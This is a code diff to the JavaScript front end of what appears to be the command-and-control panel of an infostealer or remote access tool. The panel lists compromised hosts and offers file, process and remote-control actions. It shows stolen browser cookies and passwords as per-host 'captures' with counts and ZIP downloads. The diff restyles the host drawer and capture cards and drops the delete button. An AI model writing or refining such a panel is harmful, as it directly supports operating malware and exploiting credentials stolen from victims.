@@ -187,65 +187,56 @@ function buildRow(c, onOpen) {
 }
 
 async function openHostDetail(c) {
-  $('drawer-title').textContent = c.hostname;
+  $('drawer-title').textContent = `${c.hostname} — ${c.ip}`;
   const box = $('drawer-content');
-
-  box.innerHTML = `
-    <div class="detail">
-      <div class="sub" style="margin:0;color:var(--muted)">${esc(c.ip)}</div>
-
-      <div class="kv">
-        <div class="k">client id</div> <div class="v">${c.id}</div>
-        <div class="k">state</div>     <div class="v plain" style="color:${c.online ? 'var(--green)' : 'var(--muted)'}">${c.online ? 'online' : 'offline'}</div>
-        <div class="k">ipv4</div>      <div class="v">${esc(c.ip)}</div>
-        <div class="k">country</div>   <div class="v plain">${c.country ? esc(c.country.flag + ' ' + c.country.name) : '—'}</div>
-        <div class="k">last seen</div> <div class="v plain">${new Date(c.lastSeen).toLocaleString()}</div>
-      </div>
-
-      <div style="display:flex;gap:8px;margin-top:24px;flex-wrap:wrap">
-        <button class="ghost mini" data-files>open files</button>
-        <button class="ghost mini" data-procs>processes</button>
-        <button class="ghost mini" data-remote>go to remote</button>
-        <button class="ghost mini" data-del style="border-color:rgba(248,113,113,.35);color:var(--red)">delete</button>
-      </div>
-
-      <h3 style="margin-top:28px;font-size:14px;border-bottom:1px solid var(--line);padding-bottom:8px;">captures</h3>
-      <div id="u-list" style="margin-top:12px;"><div class="note">loading…</div></div>
-    </div>`;
-
-  $('drawer').classList.add('open');
-  $('drawer-backdrop').classList.add('open');
-
-  box.querySelector('[data-remote]').addEventListener('click', () => {
+  
+  const head = document.querySelector('.drawer-head');
+  let actionsDiv = head.querySelector('.drawer-actions');
+  if (!actionsDiv) {
+    actionsDiv = document.createElement('div');
+    actionsDiv.className = 'drawer-actions';
+    actionsDiv.style.cssText = 'display:flex; gap:8px; margin-left: auto; margin-right: 16px;';
+    head.insertBefore(actionsDiv, head.querySelector('.close-btn'));
+  }
+  actionsDiv.innerHTML = `
+    <button class="ghost mini" data-action="files">files</button>
+    <button class="ghost mini" data-action="procs">procs</button>
+    <button class="ghost mini" data-action="remote">remote</button>
+  `;
+  
+  head.querySelector('[data-action="files"]').onclick = () => openFileManager(c);
+  head.querySelector('[data-action="procs"]').onclick = () => openProcs(c);
+  head.querySelector('[data-action="remote"]').onclick = () => {
     closeDrawer();
     document.querySelector('.nav a[data-tab="remote"]')?.click();
     state.remote.q = c.hostname;
     $('r-search').value = c.hostname;
     loadRemote();
-  });
-  box.querySelector('[data-files]').addEventListener('click', () => {
-    openFileManager(c);
-  });
-  box.querySelector('[data-procs]').addEventListener('click', () => {
-    openProcs(c);
-  });
-  box.querySelector('[data-del]').addEventListener('click', async () => {
-    if (!confirm(`delete ${c.hostname}?`)) return;
-    const r = await fetch(`/api/clients/${c.id}`, { method: 'DELETE' });
-    if (r.ok) { closeDrawer(); loadHosts(); }
-  });
+  };
 
-  await loadUploads(c.id, box.querySelector('#u-list'));
+  box.innerHTML = `
+    <div class="drawer-stats" id="drawer-stats">
+       <div class="note">loading…</div>
+    </div>
+    <div class="drawer-captures" id="drawer-captures">
+       <div class="note">loading…</div>
+    </div>
+  `;
+
+  $('drawer').classList.add('open');
+  $('drawer-backdrop').classList.add('open');
+
+  await loadUploads(c.id, box.querySelector('#drawer-stats'), box.querySelector('#drawer-captures'));
 }
 
-async function loadUploads(clientId, container) {
+async function loadUploads(clientId, statsContainer, capturesContainer) {
   const r = await fetch(`/api/clients/${clientId}/uploads`);
-  if (!r.ok) { container.innerHTML = '<div class="note">failed to load</div>'; return; }
+  if (!r.ok) { statsContainer.innerHTML = '<div class="note">failed to load</div>'; return; }
   const rows = await r.json();
-  container.innerHTML = '';
   
   if (rows.length === 0) {
-    container.innerHTML = '<div class="note">no captures yet.</div>';
+    statsContainer.innerHTML = '<div class="note">no captures yet.</div>';
+    capturesContainer.innerHTML = '';
     return;
   }
 
@@ -253,88 +244,50 @@ async function loadUploads(clientId, container) {
   
   if (latest && latest.stats) {
       const s = latest.stats;
-      
-      let html = `<div style="display:grid; grid-template-columns:1fr 1fr; gap:10px; margin-bottom: 20px;">`;
-      
-      html += `
-        <div class="tile" style="padding: 16px;">
+      statsContainer.innerHTML = `
+        <div class="tile">
             <div class="k" style="color:var(--green)">Netscape Cookies</div>
-            <div class="v" style="font-size: 24px; color:var(--green)">${s.netscapeCookies}</div>
-            ${s.cookieFiles.filter(f=>f.type==='netscape').map(f => `<div style="font-size:11px; color:var(--muted); margin-top:4px; font-family:var(--mono); overflow:hidden; text-overflow:ellipsis; white-space:nowrap;">${esc(f.name)} (${f.count})</div>`).join('')}
+            <div class="v" style="color:var(--green)">${s.netscapeCookies}</div>
         </div>
-      `;
-      
-      html += `
-        <div class="tile" style="padding: 16px;">
+        <div class="tile">
             <div class="k" style="color:var(--green)">JSON Cookies</div>
-            <div class="v" style="font-size: 24px; color:var(--green)">${s.jsonCookies}</div>
-            ${s.cookieFiles.filter(f=>f.type==='json').map(f => `<div style="font-size:11px; color:var(--muted); margin-top:4px; font-family:var(--mono); overflow:hidden; text-overflow:ellipsis; white-space:nowrap;">${esc(f.name)} (${f.count})</div>`).join('')}
+            <div class="v" style="color:var(--green)">${s.jsonCookies}</div>
         </div>
-      `;
-      
-      html += `
-        <div class="tile" style="padding: 16px; grid-column: span 2;">
+        <div class="tile">
             <div class="k" style="color:var(--red)">Passwords</div>
-            <div class="v" style="font-size: 24px; color:var(--red)">${s.passwords}</div>
-            <div style="display:flex; gap:8px; flex-wrap:wrap; margin-top:8px;">
-                ${s.passwordFiles.map(f => `<span class="priv-badge" style="background:var(--panel-3); border-color:var(--line-2); color:var(--text);">${esc(f.name)} (${f.count})</span>`).join('')}
-            </div>
+            <div class="v" style="color:var(--red)">${s.passwords}</div>
         </div>
       `;
       
-      html += `</div>`;
-      
-      html += `
-        <div class="tile" style="padding: 16px; display:flex; justify-content:space-between; align-items:center;">
-            <div>
-                <div class="k">Latest Capture</div>
-                <div class="v plain" style="font-size:13px; margin-top:4px;">${new Date(latest.created_at).toLocaleString()} · ${humanSize(latest.size)}</div>
-            </div>
-            <button class="primary" id="dl-latest" style="margin:0;">Download ZIP</button>
-        </div>
-      `;
-      
-      container.innerHTML = html;
-      container.querySelector('#dl-latest').addEventListener('click', () => {
-          location.href = `/api/uploads/${latest.id}/download`;
-      });
-      
-      if (rows.length > 1) {
-          const oldList = document.createElement('div');
-          oldList.style.marginTop = '20px';
-          oldList.innerHTML = `<div class="k" style="font-size:10px; margin-bottom:8px;">Previous Captures</div>`;
+      let capturesHtml = '';
+      rows.forEach((u, index) => {
+          const uStats = u.stats || { netscapeCookies: 0, jsonCookies: 0, passwords: 0, passwordFiles: [], cookieFiles: [] };
           
-          rows.slice(1).forEach(u => {
-              const el = document.createElement('div');
-              el.className = 'upload-row';
-              el.innerHTML = `
-                <div>
-                  <div class="name">${esc(u.filename)}</div>
-                  <div class="meta">${new Date(u.created_at).toLocaleString()} · ${humanSize(u.size)}</div>
+          capturesHtml += `
+            <div class="capture-card" id="cap-${index}">
+                <div class="capture-header" onclick="document.getElementById('cap-${index}').classList.toggle('open')">
+                    <div>
+                        <span style="font-weight:600; color:var(--text);">${esc(u.filename)}</span>
+                        <span style="color:var(--muted); font-size:12px; margin-left:10px;">${new Date(u.created_at).toLocaleString()} · ${humanSize(u.size)}</span>
+                    </div>
+                    <div style="display:flex; align-items:center; gap:10px;">
+                        <span class="priv-badge" style="background:var(--bg); color:var(--text); border:1px solid var(--line-2);">${uStats.netscapeCookies + uStats.jsonCookies} cookies · ${uStats.passwords} pws</span>
+                        <button class="ghost mini" onclick="event.stopPropagation(); location.href='/api/uploads/${u.id}/download'">↓</button>
+                    </div>
                 </div>
-                <button class="ghost mini" data-dl>download</button>`;
-              el.querySelector('[data-dl]').addEventListener('click', () => {
-                location.href = `/api/uploads/${u.id}/download`;
-              });
-              oldList.appendChild(el);
-          });
-          container.appendChild(oldList);
-      }
-  } else {
-      rows.forEach(u => {
-        const el = document.createElement('div');
-        el.className = 'upload-row';
-        el.innerHTML = `
-          <div>
-            <div class="name">${esc(u.filename)}</div>
-            <div class="meta">${new Date(u.created_at).toLocaleString()} · ${humanSize(u.size)}</div>
-          </div>
-          <button class="ghost mini" data-dl>download</button>`;
-        el.querySelector('[data-dl]').addEventListener('click', () => {
-          location.href = `/api/uploads/${u.id}/download`;
-        });
-        container.appendChild(el);
+                <div class="capture-body">
+                    <div style="font-size:11px; margin-bottom:8px; font-weight:600; color:var(--muted);">COOKIE FILES</div>
+                    ${uStats.cookieFiles.length ? uStats.cookieFiles.map(f => `<div style="font-family:var(--mono); font-size:12px; color:var(--text); margin-bottom:4px;">${esc(f.name)} — ${f.count} items (${f.type})</div>`).join('') : '<div class="note">None</div>'}
+                    
+                    <div style="font-size:11px; margin:12px 0 8px; font-weight:600; color:var(--muted);">PASSWORD FILES</div>
+                    ${uStats.passwordFiles.length ? uStats.passwordFiles.map(f => `<div style="font-family:var(--mono); font-size:12px; color:var(--text); margin-bottom:4px;">${esc(f.name)} — ${f.count} items</div>`).join('') : '<div class="note">None</div>'}
+                </div>
+            </div>
+          `;
       });
+      capturesContainer.innerHTML = capturesHtml;
+  } else {
+      capturesContainer.innerHTML = '<div class="note">no stats available for these captures.</div>';
   }
 }
 
@@ -344,7 +297,7 @@ async function getRemoteInfo() {
     const r = await fetch('/api/remote_ip');
     if (!r.ok) return null;
     const d = await r.json();
-    return d; // { ip, token }
+    return d;
   } catch { return null; }
 }
 
